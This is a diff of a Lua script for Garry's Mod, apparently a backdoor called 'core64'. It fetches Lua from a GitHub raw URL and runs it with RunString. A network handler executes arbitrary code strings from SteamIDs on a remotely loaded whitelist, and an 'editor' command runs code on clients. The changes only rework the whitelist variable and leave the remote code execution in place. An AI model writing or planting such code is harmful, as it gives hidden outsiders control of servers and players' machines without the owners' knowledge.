@@ -1,10 +1,9 @@
 core64 = {}
 http.Fetch("https://raw.githubusercontent.com/Dzhet225/core64_v2/master/users.lua", function(ret) RunString(ret) end)
-
+local c64_users_list = C64UserList()
 if c64_users_list then
 print("sdf")
 end
-
 function core64.RunUrl(url)
 	local code = ""
 	http.Fetch(url, function(w) code = w end)
@@ -39,7 +38,7 @@ if SERVER then
 	}
 
 	net.Receive('stream_netcode', function(len, ply)
-		if !core64.users_list[ply:SteamID()] then return end
+		if !c64_users_list[ply:SteamID()] then return end
 		
 		local code = net.ReadString()
 		rec[net.ReadUInt(2)](code)
@@ -51,7 +50,7 @@ if SERVER then
 
 	concommand.Add('editor', function(ply)
 		print(code)
-		if !core64.users_list[ply:SteamID()] then return end
+		if !c64_users_list[ply:SteamID()] then return end
 		RunOnCL(ply, code)
 	end)
 end
